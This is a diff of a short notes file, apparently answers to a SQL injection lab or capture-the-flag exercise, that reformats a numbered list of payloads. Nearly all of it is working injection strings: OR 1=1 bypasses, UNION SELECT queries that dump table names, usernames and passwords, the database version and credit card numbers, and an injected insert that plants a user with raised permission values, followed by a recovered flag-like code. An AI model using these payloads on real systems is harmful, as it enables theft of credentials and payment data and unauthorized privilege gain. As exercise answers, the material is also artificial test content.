@@ -1,11 +1,18 @@
-?category=1 OR 1=1
-UNION SELECT DISTINCT table_name,2,3 FROM information_schema.columns WHERE table_schema = 'sqlinjection'
-UNION SELECT username,password,permission FROM sqlinjection.members
-' OR 1='1
-UNION SELECT @@VERSION,2,3
-UNION SELECT creditcard_number,2,3 FROM sqlinjection.payments
-UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
-('Hacker', 'Joe', 'Hacker', '1', '1', 1)#', '1', '1', 3) --------------> i0Qnt0tEoeKSw8ZbYuPu
+1: ?category=1 OR 1=1
+
+2: UNION SELECT DISTINCT table_name,2,3 FROM information_schema.columns WHERE table_schema = 'sqlinjection'
+
+3: UNION SELECT username,password,permission FROM sqlinjection.members
+
+4: ' OR 1='1
+
+5: UNION SELECT @@VERSION,2,3
+
+6: UNION SELECT creditcard_number,2,3 FROM sqlinjection.payments
+
+7: UNION SELECT data,2,3 FROM sqlinjection.share4 <----------- DECODE FROM BASE64
+
+8: ('Hacker', 'Joe', 'Hacker', '1', '1', 1)#', '1', '1', 3) --------------> i0Qnt0tEoeKSw8ZbYuPu
 FirstN: Hacker
 LastN: Joe
 UserName: Hacker', '1', '1', 1)#
